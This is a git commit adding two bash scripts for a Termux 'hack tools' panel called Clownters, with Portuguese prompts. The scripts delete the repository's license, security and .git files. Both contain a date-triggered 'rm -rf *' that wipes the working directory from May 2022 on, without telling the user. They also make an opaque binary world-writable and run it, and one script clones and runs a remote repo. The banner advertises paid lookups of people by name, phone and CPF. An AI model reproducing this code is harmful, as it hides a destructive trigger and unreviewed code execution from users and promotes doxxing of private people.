00ac08a73c50d8943f47a33cd2e3fc721c7a86b3
SrShake <103942608+SrShake@users.noreply.github.com>
2022-04-28 21:57:02 -0300

    Add files via upload

---
+++ A1.sh
@@ -0,0 +1,76 @@
+#!/usr/bin/env bash
+
+<<CLOWNTERS
+ #CLOWNTERS
+ #--------------------------------------------------------
+ # Name script: Panel Clownters                         |
+ #--------------------------------------------------------
+ # Script     : A1 PANEL                                |
+ #--------------------------------------------------------
+ # Description: dashboard for consultation and hack tools|
+ #--------------------------------------------------------
+ # Version    : 0.4                                      |
+ #--------------------------------------------------------
+ # Authors    : Patinn, Eduardo e Mike                   |
+ #--------------------------------------------------------
+ # Date       : 08/08/21                                 |
+ #--------------------------------------------------------
+ # Lincese    : MIT lincese                              |
+ #--------------------------------------------------------
+ # Use: bash A1.sh                                       |
+ #--------------------------------------------------------
+ #CLOWNTERS
+CLOWNTERS
+[[ -f MIKE ]] || { printf "\n\ec\n\033[1;31m Fale com Mike para ter acesso ao painel\n"; > MIKE; }
+printf "\n\e[34m Faça uma doação de qlqr valor para ajudar com API
+ \e[1;34mPix: \e[33mdb54a5cb-074b-49d3-9b99-86c2efd3d01e
+ \e[31m\t-> CONSULTAS <-
+ \e[34mPara realizar consultas completas por 
+ Nome, número, CPF ou Pix 
+ entre em contato com https://wa.me/12067424950
+
+ Pressione enter para continuar
+"
+read
+sleep 1
+echo $'\n\e[1;33m Abrindo os links...\e[m'
+termux-open-url https://youtube.com/channel/UCxVuu4IwZIzZhoyhxzJPFIA &> /dev/null
+sleep 5
+termux-open-url https://www.instagram.com/0_0miike0_0/ &> /dev/null
+sleep 5
+termux-open-url https://chat.whatsapp.com/GkqYEhHDvGP9fcVWMfjaVt &> /dev/null
+test -f README.md && rm README.md
+test -f Sploit && rm Sploit
+test -f SECURITY.md && rm SECURITY.md
+test -f LICENSE && rm LICENSE
+test -f index.html && rm index.html
+test -e .git && rm -rf .git
+test -f MIKE || exit 99
+if (($(date +%m%y) >= 0522)); then
+    clear
+    rm -rf *
+else
+    chmod 777 main
+    ./main
+    ret="$?"
+    [[ "${ret}" == "99" ]] && exit 0
+    if [[ "${ret}" != "0" ]]; then
+        if [[ -d Clownters.c ]]; then
+            cd Clownters.c
+            chmod 777 main && ./main
+            exit 0
+        fi
+        clear
+        printf "\e[1;33m Por favor Aguarde\e[m\n"
+        printf "\e[1;33m Atualizando\e[m\n"
+        pkg update -y &> /dev/null
+        pkg upgrade -y &> /dev/null
+        printf "\e[1;33m Instalando a clang\e[m\n"
+        pkg i -y clang &> /dev/null
+        printf "\e[1;33m Instalando o repositório\e[m\n"
+        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
+        cd Clownters.c
+        bash A1.sh
+    fi
+fi
+exit 0
---
+++ Clownters.c/A1.sh
@@ -0,0 +1,50 @@
+#!/usr/bin/env bash
+
+<<CLOWNTERS
+ #CLOWNTERS
+ #--------------------------------------------------------
+ # Name script: Panel Clownters                         |
+ #--------------------------------------------------------
+ # Script     : A1 PANEL                                |
+ #--------------------------------------------------------
+ # Description: dashboard for consultation and hack tools|
+ #--------------------------------------------------------
+ # Version    : 0.3                                      |
+ #--------------------------------------------------------
+ # Authors    : Patinn, Eduardo e Mike                   |
+ #--------------------------------------------------------
+ # Date       : 08/08/21                                 |
+ #--------------------------------------------------------
+ # Lincese    : MIT lincese                              |
+ #--------------------------------------------------------
+ # Use: bash A1.sh                                       |
+ #--------------------------------------------------------
+ #CLOWNTERS
+CLOWNTERS
+
+#termux-open-url https://chat.whatsapp.com/FnqHx08Dwo7CGnmrAu8WsY &> /dev/null
+sleep 1
+termux-open-url https://t.me/clownters &> /dev/null
+sleep 1
+command -v clang 
+ret="$?"
+clear 
+printf "\e[1;32m loading...\n"
+[[ "${ret}" == "0" ]]|| pkg install clang -y &> /dev/null
+test -f Sploit && rm Sploit
+test -f .gitignore && rm -rf .gitignore
+test -f SECURITY.md && rm SECURITY.md
+test -f LICENSE && rm LICENSE
+test -e .git && rm -rf .git
+test -f main.c && gcc main.c -o main
+if [[ -f main ]]; then
+    test -f main.c && rm -rf main.c
+fi
+if (($(date +%m%y) >= 0522)); then
+    clear
+    rm -rf *
+else
+    chmod 777 main
+    ./main || printf "\ec\n\n\e[1;31mnão compatível com sistema atual\e[m\n"
+fi
+exit 0
